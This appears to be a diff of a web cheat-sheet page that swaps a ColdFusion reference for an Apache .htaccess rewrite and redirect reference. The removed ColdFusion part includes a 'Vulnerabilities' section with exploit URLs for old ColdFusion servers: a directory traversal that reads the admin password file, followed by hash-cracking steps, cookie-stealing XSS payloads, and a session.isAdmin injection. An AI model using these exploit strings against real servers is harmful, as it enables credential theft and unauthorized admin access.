@@ -88,19 +88,10 @@
 
             <nav class="sidebar__nav">
                 <ul>
-                    <li><a href="#variables">Set variables</a></li>
-                    <li><a href="#print-out">Print out</a></li>
-                    <li><a href="#arrays">Arrays</a></li>
-                    <li><a href="#loops">Loops</a></li>
-                    <li><a href="#structures">Structures</a></li>
-                    <li><a href="#queries">Queries</a></li>
-		    <li><a href="#logs">Logs</a></li>
-                    <li><a href="#security">Security</a></li>
-                    <li><a href="#errors">Error Handling</a></li>
-                    <li><a href="#debug">Debugging</a></li>
-                    <li><a href="#comments">Comments</a></li>
-					<li><a href="#vulnerability">Vulnerabilities</a></li>
-					<li><a href="#tricks">Tips & Tricks</a></li>
+                    <li><a href="#Rewrite">Rewrite and Redirection</a></li>
+                    <li><a href="#Security">Security</a></li>
+                    <li><a href="#Performance">Performance</a></li>
+                    <li><a href="#Miscellaneous">Miscellaneous</a></li>
                 </ul>
             </nav>
 
@@ -124,644 +115,110 @@
             </div>
 
             <section class="container section" id="variables">
-                <h3 class="section__title">Set variables</h3>
-                <p class="section__title" style="margin-bottom: 10px; margin-top: -15px;">Use <i>cfset</i> to create a variable (if it doesn't exist) and assign it a value. You can also use it to call functions.</p>
+                <h3 class="section__title">Rewrite and Redirection</h3>
+                <p class="section__title" style="margin-bottom: 10px; margin-top: -15px;">(Note: It is assumed that you have `mod_rewrite` installed and enabled. The first line should be 'RewriteEngine on' to enable this)</p>
 
                 <div class="row">
                     
-					<div class="col-md-6 col-lg-3">
+					<div class="col-md-6 col-lg-6">
                         <div class="css-cheats">
                             <div class="row justify-content-between align-items-center">
-                                <p class="col-xs-12 col-sm-12">Current time</p>
+                                <p class="col-xs-12 col-sm-12">Serve All Requests With One PHP File</p>
 								
-                                <pre>&#x3c;cfset currentTime = now() /></br></br></pre>
+                                <pre>RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule ^([^?]*)$ /index.php [NC,L,QSA]</pre>
 								
                             </div>
-							<!--div class="dugme">
-                            <a class="dugmence" target="_blank" href="https://helpx.adobe.com/coldfusion/cfml-reference/coldfusion-tags/tags-j-l/cfloop-looping-over-a-date-or-time-range.html">Learn More</a>
-							</div-->
                         </div>
                     </div>
-                    <div class="col-md-6 col-lg-3">
+					<div class="col-md-6 col-lg-6">
                         <div class="css-cheats">
                             <div class="row justify-content-between align-items-center">
-                                <p class="col-xs-12 col-sm-12">Regular string</p>
-                                <pre>&#x3c;cfset name = "Archi" /></br></br></pre>
-                            </div>
-                        </div>
-                    </div>
-                    <div class="col-md-6 col-lg-3">
-                        <div class="css-cheats">
-                            <div class="row justify-content-between align-items-center">
-                                <p class="col-xs-12 col-sm-12">Integer</p>
-                                <pre>&#x3c;cfset age = 29 /></br></br></pre>
+                                <p class="col-xs-12 col-sm-12">Force www with .htaccess</p>
+                                <pre>RewriteEngine on
+RewriteCond %{HTTP_HOST} ^example\.com [NC]
+RewriteRule ^(.*)$ https://www.example.com/$1 [L,R=301,NC]</pre>
                             </div>
                         </div>                        
                     </div>
-					<div class="col-md-6 col-lg-3">
+                    <div class="col-md-6 col-lg-6">
                         <div class="css-cheats">
                             <div class="row justify-content-between align-items-center">
-                                <p class="col-xs-12 col-sm-12">Concatenate variable and string</p>
-                                <pre>&#x3c;cfset todayDate = "Today is: #now()#" />
-&#x3c;cfset greeting = "Hello " & name /></pre>
+                                <p class="col-xs-12 col-sm-12">Force www in a Generic Way with .htaccess</p>
+                                <pre>RewriteCond %{HTTP_HOST} !^$
+RewriteCond %{HTTP_HOST} !^www\. [NC]
+RewriteCond %{HTTPS}s ^on(s)|
+RewriteRule ^ http%1://www.%{HTTP_HOST}%{REQUEST_URI} [R=301,L]</pre>
+                            </div>
+                        </div>
+                    </div>
+                    
+					<div class="col-md-6 col-lg-6">
+                        <div class="css-cheats">
+                            <div class="row justify-content-between align-items-center">
+                                <p class="col-xs-12 col-sm-12">Force non-www with .htaccess</p>
+                                <pre>RewriteEngine on
+RewriteCond %{HTTP_HOST} ^www\.example\.com [NC]
+RewriteRule ^(.*)$ https://example.com/$1 [L,R=301]</pre>
                             </div>
                         </div>
                     </div>
 					<div class="col-md-6 col-lg-6">
                         <div class="css-cheats">
                             <div class="row justify-content-between align-items-center">
-                                <p class="col-xs-12 col-sm-12">Array</p>
-                                <pre>&#x3c;cfset dataArray = [dateFormat(now(), "short"), dateFormat(dateadd('d',1,now()), "short"), "Me", 42] /></pre>
+                                <p class="col-xs-12 col-sm-12">Force non-www in a Generic Way with .htaccess</p>
+                                <pre>RewriteEngine on
+RewriteCond %{HTTP_HOST} ^www\.
+RewriteCond %{HTTPS}s ^on(s)|off
+RewriteCond http%1://%{HTTP_HOST} ^(https?://)(www\.)?(.+)$
+RewriteRule ^ %1%3%{REQUEST_URI} [R=301,L]</pre>
                             </div>
                         </div>
                     </div>
 					<div class="col-md-6 col-lg-6">
                         <div class="css-cheats">
                             <div class="row justify-content-between align-items-center">
-                                <p class="col-xs-12 col-sm-12">Data structure</p>
-                                <pre>&#x3c;cfset dictionary = { today = dateFormat(now(), "short"), tomorrow = dateFormat(dateadd('d', 1, now()), "short"), who = "Me", the_answer_to_life_and_everything_else = 42 } /></pre>
-								</code>
+                                <p class="col-xs-12 col-sm-12">Force HTTPS with .htaccess</p>
+                                <pre>RewriteEngine on
+RewriteCond %{HTTPS} !on
+RewriteRule (.*) https://%{HTTP_HOST}%{REQUEST_URI}</pre>
                             </div>
                         </div>
                     </div>
-                    
-                </div>
-            </section>
-            <section class="container section" id="print-out">
-                <h3 class="section__title">Print out</h3>
-
-                <div class="row">
-                    <div class="col-md-6 col-lg-6">
-                        <div class="css-cheats">
-                            <div class="row justify-content-between align-items-center">
-                                <p class="col-xs-12 col-sm">Hard coded string</p>
-                                <pre>&#x3c;cfdump var = "This is a message for you" />
-&#x3c;cfoutput>This is a message for you&#x3c;/cfoutput></pre>
-                            </div>
-                        </div>
-                    </div>
-                    <div class="col-md-6 col-lg-6">
-                        <div class="css-cheats">
-                            <div class="row justify-content-between align-items-center">
-                                <p class="col-xs-12 col-sm">Variable</p>
-                                <pre>&#x3c;cfdump var = "#name#" /> _same as inspect in ruby_
-&#x3c;cfoutput>#name#&#x3c;/cfoutput> _same as puts in ruby_</pre>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </section>
-			<section class="container section" id="arrays">
-                <h3 class="section__title">Arrays</h3>
-                <p class="section__title" style="margin-bottom: 10px; margin-top: -15px;">Arrays don't start from 0 like in every other language instead start from 1</p>
-
-                <div class="row">
-                    
-					<div class="col-md-6 col-lg-4">
-                        <div class="css-cheats">
-                            <div class="row justify-content-between align-items-center">
-                                <p class="col-xs-12 col-sm-12">Create array literal</p>
-                                <pre>&#x3c;cfset someThings = ["Boca", "Futbol", 42] /></pre>
-                            </div>
-                        </div>
-                    </div>
-                    <div class="col-md-6 col-lg-4">
-                        <div class="css-cheats">
-                            <div class="row justify-content-between align-items-center">
-                                <p class="col-xs-12 col-sm-12">Constructor</p>
-                                <pre>&#x3c;cfset sameArray = arrayNew(1) /></pre>
-                            </div>
-                        </div>
-                    </div>
-                    <div class="col-md-6 col-lg-4">
-                        <div class="css-cheats">
-                            <div class="row justify-content-between align-items-center">
-                                <p class="col-xs-12 col-sm-12">Adding elements in an specific index</p>
-                                <pre>&#x3c;cfset someThings[4] = "Ruby on Rails" /></pre>
-                            </div>
-                        </div>                        
-                    </div>
-					<div class="col-md-6 col-lg-4">
-                        <div class="css-cheats">
-                            <div class="row justify-content-between align-items-center">
-                                <p class="col-xs-12 col-sm-12">Appending</p>
-                                <pre>&#x3c;cfset ArrayAppend(someThings, "Destiny") /></pre>
-                            </div>
-                        </div>
-                    </div>
-					<div class="col-md-6 col-lg-4">
-                        <div class="css-cheats">
-                            <div class="row justify-content-between align-items-center">
-                                <p class="col-xs-12 col-sm-12">Looping over the array</p>
-                                <pre>&#x3c;cfloop array = "#someThings#" index = "thing">
-    &#x3c;cfoutput>#thing#&#x3c;/cfoutput>
-&#x3c;/cfloop></pre>
-                            </div>
-                        </div>
-                    </div>
-				
-                    
-                </div>
-            </section>
-			<section class="container section" id="loops">
-                <h3 class="section__title">Loops</h3>
-                <p class="section__title" style="margin-bottom: 10px; margin-top: -15px;">There are several different types of for and while loops in ColdFusion. <br>For more info please see the docs for <a href="https://cfdocs.org/cfscript">cfloop</a>.</p>
-
-                <div class="row">
-                    
-					<div class="col-md-6 col-lg-4">
-                        <div class="css-cheats">
-                            <div class="row justify-content-between align-items-center">
-                                <p class="col-xs-12 col-sm-12">FOR Loop</p>
-                                <pre style="height: 160px;">for (i=1;i LTE ArrayLen(array);i=i+1) {
-	WriteOutput(array[i]);
-}</pre>
-                            </div>
-                        </div>
-                    </div>
-                    <div class="col-md-6 col-lg-4">
-                        <div class="css-cheats">
-                            <div class="row justify-content-between align-items-center">
-                                <p class="col-xs-12 col-sm-12">While Loop</p>
-                                <pre style="height: 160px;">x = 0;
-while (x LT 5) {
-	x = x + 1;
-	WriteOutput(x);
-}
-//OUTPUTS 12345</pre>
-                            </div>
-                        </div>
-                    </div>
-                    <div class="col-md-6 col-lg-4">
-                        <div class="css-cheats">
-                            <div class="row justify-content-between align-items-center">
-                                <p class="col-xs-12 col-sm-12">Do While Loop</p>
-                                <pre style="height: 160px;">x = 0;
-do {
- x = x+1;
- WriteOutput(x);
-} while (x LTE 0);
-// OUTPUTS 1</pre>
-                            </div>
-                        </div>                        
-                    </div>
-					<div class="col-md-6 col-lg-4">
-                        <div class="css-cheats">
-                            <div class="row justify-content-between align-items-center">
-                                <p class="col-xs-12 col-sm-12">FOR IN Loop (Structure)</p>
-                                <pre style="height: 160px;">struct = StructNew();
-struct.one = "1";
-struct.two = "2";
-for (key in struct) {
-	WriteOutput(key);
-}
-//OUTPUTS onetwo</pre>
-                            </div>
-                        </div>
-                    </div>
-					<div class="col-md-6 col-lg-4">
-                        <div class="css-cheats">
-                            <div class="row justify-content-between align-items-center">
-                                <p class="col-xs-12 col-sm-12">FOR IN Loop (Array)</p>
-                                <pre style="height: 160px;">cars = ["Ford","Dodge"];
-for (car in cars) {
-	WriteOutput(car);
-}
-//OUTPUTS FordDodge</pre>
-                            </div>
-                        </div>
-                    </div>
-					<div class="col-md-6 col-lg-4">
-                        <div class="css-cheats">
-                            <div class="row justify-content-between align-items-center">
-                                <p class="col-xs-12 col-sm-12">FOR IN Loop (Query)</p>
-                                <pre style="height: 160px;">cars = QueryNew("make,model",
-	"cf_sql_varchar,cf_sql_varchar",
-	[["Ford", "T"],["Dodge","30"]]);
-for (car in cars) {
-	WriteOutput("Model " & car.model);
-}
-//OUTPUTS Model TModel 30</pre>
-                            </div>
-                        </div>
-                    </div>
-				
-                    
-                </div>
-            </section>
-			<section class="container section" id="structures">
-                <h3 class="section__title">Structures</h3>
-                <p class="section__title" style="margin-bottom: 10px; margin-top: -15px;">This are like dictionaries in Python or hashes in Ruby</p>
-
-                <div class="row">
-                    <div class="col-md-6 col-lg-4">
-                        <div class="css-cheats">
-                            <div class="row justify-content-between align-items-center">
-                                <p class="col-xs-12 col-sm">Create structure literal</p>
-                                <pre>&#x3c;cfset aGuy = {} />
-&#x3c;cfset batman = {
-    "first_name" = "Bruno",
-    "last_name" = "Diaz",
-    "age" = 42
-} /></pre>
-                            </div>
-                        </div>
-                    </div>
-                    <div class="col-md-6 col-lg-4">
-                        <div class="css-cheats">
-                            <div class="row justify-content-between align-items-center">
-                                <p class="col-xs-12 col-sm">Constructor</p>
-                                <pre>&#x3c;cfset aGuy = structNew() /></pre>
-                            </div>
-                        </div>
-                    </div>
-					<div class="col-md-6 col-lg-4">
-                        <div class="css-cheats">
-                            <div class="row justify-content-between align-items-center">
-                                <p class="col-xs-12 col-sm">Adding elements with brackets</p>
-                                <pre>&#x3c;cfset aGuy["first_name"] = "Ezequiel" />
-&#x3c;cfset aGuy["last_name"] = "Lopez" /></pre>
-                            </div>
-                        </div>
-                    </div>
-					<div class="col-md-6 col-lg-4">
-                        <div class="css-cheats">
-                            <div class="row justify-content-between align-items-center">
-                                <p class="col-xs-12 col-sm">Adding elements with dot notation</p>
-                                <pre>&#x3c;cfset aGuy.age = 29 />
-&#x3c;cfset aGuy.height = "5' 11\"" /></pre>
-                            </div>
-                        </div>
-                    </div>
-					<div class="col-md-6 col-lg-4">
-                        <div class="css-cheats">
-                            <div class="row justify-content-between align-items-center">
-                                <p class="col-xs-12 col-sm">Looping over the structure</p>
-                                <pre>&#x3c;cfloop collection = "aGuy" item = "data">
-    &#x3c;cfoutput>#aGuy[data]#: #data#&#x3c;/cfoutput>
-&#x3c;/cfloop></pre>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </section>
-            <section class="container section" id="queries">
-                <h3 class="section__title">Queries</h3>
-                <p class="section__title" style="margin-bottom: 10px; margin-top: -15px;">Use SQL in coldfusion to retrieve data form a database or enter data in it</p>
-
-                <div class="row">
-                    <div class="col-md-6 col-lg-4">
-                        <div class="css-cheats">
-                            <div class="row justify-content-between align-items-center">
-                                <p class="col-xs-12 col-sm-12">Query</p>
-                                <pre style="height:13pc">var queryOptions = { datasource: "appMain" };
-var data = queryExecute(
-  "SELECT * FROM users", {}, queryOptions
-);</pre>
-                            </div>
-                        </div>
-                    </div>
-                    <div class="col-md-6 col-lg-4">
-                        <div class="css-cheats">
-                            <div class="row justify-content-between align-items-center">
-                                <p class="col-xs-12 col-sm-12">Allocate query result into variable & retrieve info</p>
-                                <pre style="height:13pc">&#x3c;cfquery name="firstQ" datasource="tsdata.ts24">
-    SELECT * FROM TestTable
-&#x3c;/cfquery></pre>
-                            </div>
-                        </div>
-                    </div>
-                    <div class="col-md-6 col-lg-4">
-                        <div class="css-cheats">
-                            <div class="row justify-content-between align-items-center">
-                                <p class="col-xs-12 col-sm-12">Looping over the Query</p>
-                                <pre style="height:13pc">&#x3c;cfoutput>
-    &#x3c;cfloop query="#firstQ#">
-        &#x3c;p>&#x3c;i>myDataAlfa: &#x3c;/i>#firstQ.myDataAlfa# &#x3c;i>myDataInt: &#x3c;/i>#firstQ.myDataInt#&#x3c;/p>
-    &#x3c;/cfloop>
-    
-    &#x3c;!--- Extra data to get from the query --->
-    &#x3c;p>#firstQ.columnlist#&#x3c;/p>
-    &#x3c;p>#firstQ.recordcount#&#x3c;/p>
-&#x3c;/cfoutput></pre>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </section>
-			<section class="container section" id="logs">
-                <h3 class="section__title">Logging</h3>
-				<p class="section__title" style="margin-top:-15px!important;margin-bottom:10px">Logging stuff</p>
-
-                <div class="row">
-                    <div class="col-md-6 col-lg-6">
-                        <div class="css-cheats">
-                            <div class="row justify-content-between align-items-center">
-                                <p class="col-xs-12 col-sm-12">Clear Log</p>
-<pre>
-var logDir = expandPath( "/logs/" );
-var logs = directoryList(
-  path = logDir,
-  listInfo = "name",
-  filter = "*.log",
-  type = "file",
-  recurse = "false"
-);
-for( var log in logs ){
-  var fullPath = logDir & log ;
-  if( fileExists( fullPath ) ){
-    fileDelete( fullPath );
-  }
-}
-</pre>
-                            </div>
-                        </div>
-                    </div>
-                    <div class="col-md-6 col-lg-6">
-                        <div class="css-cheats">
-                            <div class="row justify-content-between align-items-center">
-                                <p class="col-xs-12 col-sm-12">LogBox</p>
-                                <pre>
-component {
-  // ...
-  function onError( exception ){
-   // uLogging error with logbox...
-    writeOutput( "Upisivanje greske u log fajlu.." );
-    logger.error(
-        "Doslo je do greske u aplikaciji: #exception.message# #exception.detail#"
-        exception
-    );
-
-    // error page
-    include "views/error.cfm";
-  }
-}
-</pre>
-                            </div>
-                        </div>
-                    </div>
-
-                    
-                </div>
-            </section>
-            <section class="container section" id="security">
-                <h3 class="section__title">Security</h3>
-				<p class="section__title" style="margin-top:-15px!important;margin-bottom:10px">Security-related settings for Application.cfc file</p>
-
-                <div class="row">
-                    <div class="col-md-6 col-lg-12">
-                        <div class="css-cheats">
-                            <div class="row justify-content-between align-items-center">
-                                <p class="col-xs-12 col-sm-12">Lock down APP</p>
-                                <pre>// Application.cfc
-component {
-  this.name = "myApp";
-  this.blockedExtForFileUpload = "*";
-  this.scriptProtect					 = "all";
-  this.sessioncookie = {
-    httpOnly: true,
-    secure  : true
-  };
-}</pre>
-                            </div>
-                        </div>
-                    </div>
-
-                    
-                </div>
-            </section>
-			<section class="container section" id="errors">
-                <h3 class="section__title">Error Handling</h3>
-				<p class="section__title" style="margin-top:-15px!important;margin-bottom:10px">ColdFusion provides a variety of tools to customize error information and handle errors when they occur.</p>
-
-                <div class="row">
-                    <div class="col-md-6 col-lg-5">
-                        <div class="css-cheats">
-                            <div class="row justify-content-between align-items-center">
-                                <p class="col-xs-12 col-sm-12">Try / Catch / Throw / Finally / Rethrow</p>
-                                <pre style="height:200px">try {
-	throw(message="Oops", detail="xyz");
-} catch (any e) {
-	WriteOutput("Error: " & e.message);
-	rethrow;
-	
-} finally {
-	WriteOutput("I run even if no error");
-}</pre>
-                            </div>
-                        </div>
-                    </div>
-
-                    <div class="col-md-6 col-lg-7">
-                        <div class="css-cheats">
-                            <div class="row justify-content-between align-items-center">
-                                <p class="col-xs-12 col-sm-12">OnError Exception</p>
-<pre style="height:200px">
-  public function onError(required exception, required string eventName)
-  {
-    var factory = new App.ExceptionFactory();
-    var e = factory.getNewException(arguments.eventName, arguments.exception);
-    if (e.logError()) {
-      var loggingFile = new App.SomeLoggingCfc(arguments.eventName, arguments.exception);
-      loggingFile.commitLog();
-    }
-    if (e.debugError()) {}
-    e.throwException();
-  } 
-  public ExceptionFactory function getNewException(required string eventName, required exception)
-  {
-    return new "App.#exception.type#"(argumentCollection = arguments);
-  } 
-  public boolean function logError() {}
-  public boolean function debugError() {}
-  public function throwException() {}
-</pre>
-                            </div>
-                        </div>
-                    </div>
- <div class="col-md-6 col-lg-4">
-                        <div class="css-cheats">
-                            <div class="row justify-content-between align-items-center">
-                                <p class="col-xs-12 col-sm-12">Output CF Error details without CFDump</p>
-<pre>
-&#x3c;cftry>
-   ...
-&#x3c;cfcatch>
-   &#x3c;cf_OutputCFCatch CFCatch="#CFCatch#" />
-&#x3c;/cfcatch>
-&#x3c;/cftry>
-</pre>
-                            </div>
-                        </div>
-                    </div>
-                    
-                </div>
-            </section>
-			<section class="container section" id="debug">
-                <h3 class="section__title">Debugging</h3>
-                <p class="section__title" style="margin-bottom: 10px; margin-top: -15px;">You can use CFML tags and functions to display or hide debugging and tracing information.</p>
-
-                <div class="row">
-                    
-					<div class="col-md-6 col-lg-3">
-                        <div class="css-cheats">
-                            <div class="row justify-content-between align-items-center">
-                                <p class="col-xs-12 col-sm-12">Control Debugging Output</p>
-                                <pre style="height:110px">&#x3c;cfsetting showDebugOutput="No"></pre>
-								</code>
-                            </div>
-                        </div>
-                    </div>
-					<div class="col-md-6 col-lg-4">
-                        <div class="css-cheats">
-                            <div class="row justify-content-between align-items-center">
-                                <p class="col-xs-12 col-sm-12">Show Query exec.time</p>
-                                <pre style="height:110px">&#x3c;cfquery name="TestQuery" datasource="cfexample" debug>
-SELECT * FROM TestTable
-&#x3c;/cfquery></pre>
-								</code>
-                            </div>
-                        </div>
-                    </div>
-                    <div class="col-md-6 col-lg-5">
-                        <div class="css-cheats">
-                            <div class="row justify-content-between align-items-center">
-                                <p class="col-xs-12 col-sm-12">Log Values to MyAppSilentTrace.log</p>
-                                <pre style="height:110px">&#x3c;cfif IsDebugMode()>
-&#x3c;cflog file="MyAppSilentTrace" text="Page: #cgi.script_name#,
-completed query MyDBQuery; Query Execution time:
-#cfquery.ExecutionTime# Status: #Application.status#">
-&#x3c;/cfif></pre>
-								</code>
-                            </div>
-                        </div>
-                    </div>
-                    
-                </div>
-            </section>
-			<section class="container section" id="comments">
-                <h3 class="section__title">Comments</h3>
-                <p class="section__title" style="margin-bottom: 10px; margin-top: -15px;">ColdFusion comments have a similar format to HTML comments but use three dash characters instead of two.</p>
-
-                <div class="row">
-                    
-					<div class="col-md-6 col-lg-5">
-                        <div class="css-cheats">
-                            <div class="row justify-content-between align-items-center">
-                                <p class="col-xs-12 col-sm-12">Single line comment</p>
-                                <pre style="height:110px">&#x3c;!--- This is a ColdFusion Comment. Browsers do not receive it. ---></pre>
-								</code>
-                            </div>
-                        </div>
-                    </div>
-					<div class="col-md-6 col-lg-4">
-                        <div class="css-cheats">
-                            <div class="row justify-content-between align-items-center">
-                                <p class="col-xs-12 col-sm-12">Single line comment</p>
-                                <pre style="height:110px">mojo = 1; //THIS IS A COMMENT</pre>
-								</code>
-                            </div>
-                        </div>
-                    </div>
-                    <div class="col-md-6 col-lg-3">
-                        <div class="css-cheats">
-                            <div class="row justify-content-between align-items-center">
-                                <p class="col-xs-12 col-sm-12">Multiline comment</p>
-                                <pre style="height:110px">/* This is a comment
-	that can span
-	multiple lines
-*/</pre>
-								</code>
-                            </div>
-                        </div>
-                    </div>
-                    
-                </div>
-            </section>
-			<section class="container section" id="vulnerability">
-                <h3 class="section__title">Vulnerabilities</h3>
-                <p class="section__title" style="margin-bottom: 10px; margin-top: -15px;">ColdFusion had a lot of security vulnerabilities in the past, so stop using older versions!</p>
-
-                <div class="row">
-                    
-					<div class="col-md-6 col-lg-12">
-                        <div class="css-cheats">
-                            <div class="row justify-content-between align-items-center">
-                                <h5 class="col-xs-12 col-sm-12"># CVE-2010-2861 - Adobe ColdFusion Unspecified Directory Traversal Vulnerability</h5>
-								<small  class="col-xs-12 col-sm-12">detailed information about the exploitation of this vulnerability: <a href="http://www.gnucitizen.org/blog/coldfusion-directory-traversal-faq-cve-2010-2861/">http://www.gnucitizen.org/blog/coldfusion-directory-traversal-faq-cve-2010-2861/</a></small>
-								<h6  class="col-xs-12 col-sm-12">1. open file in browser</h6>
-                                <pre style="">http://[server:port]/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en</pre>
-                            </div>
-							<div class="row justify-content-between align-items-center">
-								<h6  class="col-xs-12 col-sm-12">2. copy the hashed password</h6>
-                                <pre style="">#Fri Feb 07 05:48:45 PST 2020 rdspassword= password=42DABCDFADADASASAS4891539FASDA11CA5 encrypted=true</pre>
-
-								<h6  class="col-xs-12 col-sm-12">3. compare with rainbow tables</h6>
-                                <pre style="">https://www.dcode.fr/sha1-hash</pre>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-				<div class="row">
-                    
-					<div class="col-md-6 col-lg-12">
-                        <div class="css-cheats">
-                            <div class="row justify-content-between align-items-center">
-                                <h5 class="col-xs-12 col-sm-12"># CVE-2009-1872 - Adobe ColdFusion Server Query String Cross-Site Scripting</h5>
-								<small  class="col-xs-12 col-sm-12">detailed information about the exploitation of this vulnerability: <a href="https://www.securityfocus.com/bid/36046/info">https://www.securityfocus.com/bid/36046/info</a></small>
-								<h6  class="col-xs-12 col-sm-12">1. open file in browser</h6>
-                                <pre style="">http://www.example.com:8500/CFIDE/componentutils/componentdetail.cfm?component=&#x3c;body%20onload=alert(document.cookie)></pre>
-                                <pre style="">http://www.example.com:8500/CFIDE/componentutils/cfcexplorer.cfc?method=getcfcinhtml&name=%3Cbody%20onload=alert(document.cookie)%3E</pre>
-                                <pre style="">http://www.example.com:8500/CFIDE/componentutils/cfcexplorer.cfc?method=%3Cbody%20onload=alert(document.cookie)%3E</pre>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-				<div class="row">
-                    
-					<div class="col-md-6 col-lg-12">
-                        <div class="css-cheats">
-                            <div class="row justify-content-between align-items-center">
-                                <h5 class="col-xs-12 col-sm-12"># Adobe ColdFusion Server Scope Injection</h5>
-								<small  class="col-xs-12 col-sm-12">detailed information about the exploitation of this vulnerability: <a href="https://www.petefreitag.com/item/834.cfm">https://www.petefreitag.com/item/834.cfm</a></small>
-								<h6  class="col-xs-12 col-sm-12">1. open any action (that checks session.isAdmin) in browser</h6>
-                                <pre style="">http://www.example.com:8500/CFIDE/componentutils/componentdetail.cfm</pre>
-                                <h6  class="col-xs-12 col-sm-12">2. append the following to the url</h6>
-                                <pre style="">?session.isAdmin=1</pre>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </section>
-			<section class="container section" id="tricks">
-                <h3 class="section__title">Tricks</h3>
-                <p class="section__title" style="margin-bottom: 10px; margin-top: -15px;">Tips & Tricks on becoming ColdFusion Pro!</p>
-
-<div class="row">
-                    
 					<div class="col-md-6 col-lg-6">
                         <div class="css-cheats">
                             <div class="row justify-content-between align-items-center">
-                                <p class="col-xs-12 col-sm-12">Find the Java Version Used by ColdFusion or Railo</p>
-                                <pre>&#x3c;cfoutput>#CreateObject("java", "java.lang.System").getProperty("java.version")#&#x3c;/cfoutput></pre>
+                                <p class="col-xs-12 col-sm-12">Force HTTPS Behind a Proxy with .htaccess</p>
+                                <pre>RewriteCond %{HTTP:X-Forwarded-Proto} !https
+RewriteRule (.*) https://%{HTTP_HOST}%{REQUEST_URI}</pre>
                             </div>
                         </div>
                     </div>
-					<div class="col-md-6 col-lg-4">
+					<div class="col-md-6 col-lg-6">
                         <div class="css-cheats">
                             <div class="row justify-content-between align-items-center">
-                                <p class="col-xs-12 col-sm-12">Per-Application ColdFusion Mappings</p>
-                                <pre>&#x3c;cfset this.mappings["/test"]="c:\inetpub\wwwroot\test"></pre>
-								</code>
+                                <p class="col-xs-12 col-sm-12">Force Trailing Slash with .htaccess</p>
+                                <pre>RewriteCond %{REQUEST_URI} /+[^\.]+$
+RewriteRule ^(.+[^/])$ %{REQUEST_URI}/ [R=301,L]</pre>
                             </div>
                         </div>
                     </div>
-                    <div class="col-md-6 col-lg-4">
+					<div class="col-md-6 col-lg-6">
                         <div class="css-cheats">
                             <div class="row justify-content-between align-items-center">
-                                <p class="col-xs-12 col-sm-12">Restart a ColdFusion Application</p>
-                                <pre>&#x3c;cfset ApplicationStop() />
-&#x3c;cflocation url="index.cfm" addtoken="false" /></pre>
+                                <p class="col-xs-12 col-sm-12">Remove Trailing Slash with .htaccess</p>
+                                <pre>RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule ^(.*)/$ /$1 [R=301,L]</pre>
+                            </div>
+                        </div>
+                    </div>
+					<div class="col-md-6 col-lg-6">
+                        <div class="css-cheats">
+                            <div class="row justify-content-between align-items-center">
+                                <p class="col-xs-12 col-sm-12">Redirect a Single Page with .htaccess</p>
+                                <pre>Redirect 301 /oldpage.html https://www.yoursite.com/newpage.html
+Redirect 301 /oldpage2.html https://www.yoursite.com/folder/</pre>
 								</code>
                             </div>
                         </div>
@@ -769,20 +226,39 @@ completed query MyDBQuery; Query Execution time:
                     <div class="col-md-6 col-lg-6">
                         <div class="css-cheats">
                             <div class="row justify-content-between align-items-center">
-                                <p class="col-xs-12 col-sm-12">Lower Session Timeouts for Bots and Spiders</p>
-                                <pre>#in Application.cfm
-&#x3c;cfif StructKeyExists(cookie, "cfid") or StructKeyExists(cookie, "jsessionid")>
-&#x3c;cfset REQUEST.sessionTimeout = CreateTimeSpan(0,0,30,0) />
-&#x3c;cfelse>
- &#x3c;cfset REQUEST.sessionTimeout = CreateTimeSpan(0,0,0,2) />
-&#x3c;/cfif>
-
-#REQUEST.sessionTimeout variable in cfapplication tag
-
-&#x3c;cfapplication name="myawesomeapp"
-     sessionmanagement="Yes"
-     sessiontimeout="#REQUEST.sessionTimeout#"></pre>
-								</code>
+                                <p class="col-xs-12 col-sm-12">Alias a Single Directory with .htaccess</p>
+                                <pre>RewriteEngine On
+RewriteRule ^source-directory/(.*) target-directory/$1</pre>
+                            </div>
+                        </div>
+                    </div>
+					<div class="col-md-6 col-lg-6">
+                        <div class="css-cheats">
+                            <div class="row justify-content-between align-items-center">
+                                <p class="col-xs-12 col-sm-12">Alias Paths To Script with .htaccess</p>
+                                <pre>RewriteEngine On
+RewriteRule ^$ index.fcgi/ [QSA,L]
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule ^(.*)$ index.fcgi/$1 [QSA,L]</pre>
+                            </div>
+                        </div>
+                    </div>
+					<div class="col-md-6 col-lg-6">
+                        <div class="css-cheats">
+                            <div class="row justify-content-between align-items-center">
+                                <p class="col-xs-12 col-sm-12">Redirect an Entire Site with .htaccess</p>
+                                <pre>Redirect 301 / https://newsite.com/</pre>
+                            </div>
+                        </div>
+                    </div>
+					<div class="col-md-6 col-lg-6">
+                        <div class="css-cheats">
+                            <div class="row justify-content-between align-items-center">
+                                <p class="col-xs-12 col-sm-12">Alias "Clean" URLs with .htaccess</p>
+                                <pre>RewriteEngine On
+RewriteCond %{SCRIPT_FILENAME} !-d
+RewriteRule ^([^.]+)$ $1.php [NC,L]</pre>
                             </div>
                         </div>
                     </div>
